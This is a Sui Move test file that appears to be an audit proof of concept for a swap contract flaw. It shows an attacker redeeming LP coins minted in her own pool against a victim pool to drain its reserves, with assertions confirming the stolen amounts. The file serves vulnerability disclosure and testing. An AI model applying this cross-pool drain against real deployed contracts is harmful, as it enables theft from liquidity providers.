// Copyright (c) Flicky Labs
// SPDX-License-Identifier: Apache-2.0
//
// PoC for finding 4982 — LP receipts not bound to issuing pool;
// `create_pool` is permissionless → cross-pool reserve drain.

#[test_only]
module swap::audit_poc_tests;

use sui::coin;
use sui::object::ID;
use sui::sui::SUI;
use sui::test_scenario::{Self as ts, Scenario};
use swap::swap;

// A custom Y-coin type so we get a distinct pair <SUI, COIN_Y>.
public struct COIN_Y has drop {}

const ADMIN: address = @0xA;
const ALICE: address = @0xA11CE; // victim LP provider
const EVE: address = @0xE1E; // attacker

const VICTIM_X: u64 = 2000;
const VICTIM_Y: u64 = 500;
const ATTACKER_X: u64 = 100;
const ATTACKER_Y: u64 = 100;

fun mint_x(amount: u64, scenario: &mut Scenario): coin::Coin<SUI> {
    coin::mint_for_testing<SUI>(amount, scenario.ctx())
}

fun mint_y(amount: u64, scenario: &mut Scenario): coin::Coin<COIN_Y> {
    coin::mint_for_testing<COIN_Y>(amount, scenario.ctx())
}

#[test]
fun poc_4982_cross_pool_lp_drain() {
    let mut scenario = ts::begin(ADMIN);

    // === Tx 1 (ALICE): create victim pool V ===
    scenario.next_tx(ALICE);
    swap::create_pool<SUI, COIN_Y>(30, scenario.ctx());

    // === Tx 2 (ALICE): fund V ===
    scenario.next_tx(ALICE);
    let pool_v_id: ID =
        ts::most_recent_id_shared<swap::Pool<SUI, COIN_Y>>().destroy_some();
    let mut pool_v = ts::take_shared_by_id<swap::Pool<SUI, COIN_Y>>(&scenario, pool_v_id);
    let cx = mint_x(VICTIM_X, &mut scenario);
    let cy = mint_y(VICTIM_Y, &mut scenario);
    let alice_lp = swap::add_liquidity<SUI, COIN_Y>(&mut pool_v, cx, cy, scenario.ctx());
    coin::burn_for_testing(alice_lp);
    ts::return_shared(pool_v);

    // === Tx 3 (EVE): create attacker pool A ===
    scenario.next_tx(EVE);
    swap::create_pool<SUI, COIN_Y>(30, scenario.ctx());

    // === Tx 4 (EVE): fund A → mint attacker LP coin ===
    scenario.next_tx(EVE);
    let pool_a_id: ID =
        ts::most_recent_id_shared<swap::Pool<SUI, COIN_Y>>().destroy_some();
    let mut pool_a = ts::take_shared_by_id<swap::Pool<SUI, COIN_Y>>(&scenario, pool_a_id);
    let cx = mint_x(ATTACKER_X, &mut scenario);
    let cy = mint_y(ATTACKER_Y, &mut scenario);
    let attacker_lp = swap::add_liquidity<SUI, COIN_Y>(&mut pool_a, cx, cy, scenario.ctx());
    ts::return_shared(pool_a);

    let attacker_lp_value = coin::value(&attacker_lp);
    assert!(attacker_lp_value == 100, 110); // sqrt(100*100)=100

    // Sanity: V reserves 2000/500, LP supply 1000.
    scenario.next_tx(EVE);
    let pool_v = ts::take_shared_by_id<swap::Pool<SUI, COIN_Y>>(&scenario, pool_v_id);
    let (rx, ry) = swap::pool_reserves<SUI, COIN_Y>(&pool_v);
    let supply_v = swap::pool_lp_supply<SUI, COIN_Y>(&pool_v);
    assert!(rx == VICTIM_X, 100);
    assert!(ry == VICTIM_Y, 101);
    assert!(supply_v == 1000, 102);
    ts::return_shared(pool_v);

    // === Exploit tx (EVE): present pool-A LP coin to victim pool V ===
    //
    // `remove_liquidity` burns the supplied LP coin against `pool.lp_supply`
    // and splits `pool.balance_x` / `pool.balance_y` proportionally. There
    // is NO check that the LP was minted by this pool — LP<X,Y> is a single
    // fungible type across every Pool<X,Y> instance, and
    // `balance::decrease_supply` is provenance-free.
    scenario.next_tx(EVE);
    let mut pool_v = ts::take_shared_by_id<swap::Pool<SUI, COIN_Y>>(&scenario, pool_v_id);
    let (drained_x, drained_y) =
        swap::remove_liquidity<SUI, COIN_Y>(&mut pool_v, attacker_lp, scenario.ctx());
    ts::return_shared(pool_v);

    let stolen_x = coin::value(&drained_x);
    let stolen_y = coin::value(&drained_y);

    // 100 LP against victim supply 1000 → 1/10 of each reserve.
    // V started at 2000/500; Eve walks away with 200 SUI + 50 COIN_Y.
    assert!(stolen_x == 200, 120); // 2000 * 100 / 1000
    assert!(stolen_y == 50, 121); // 500 * 100 / 1000

    // V's reserves have shrunk by exactly the stolen amounts.
    scenario.next_tx(EVE);
    let pool_v = ts::take_shared_by_id<swap::Pool<SUI, COIN_Y>>(&scenario, pool_v_id);
    let (rx_final, ry_final) = swap::pool_reserves<SUI, COIN_Y>(&pool_v);
    assert!(rx_final == VICTIM_X - stolen_x, 130);
    assert!(ry_final == VICTIM_Y - stolen_y, 131);
    ts::return_shared(pool_v);

    // Cleanup drained coins (Eve's loot).
    coin::burn_for_testing(drained_x);
    coin::burn_for_testing(drained_y);

    scenario.end();
}
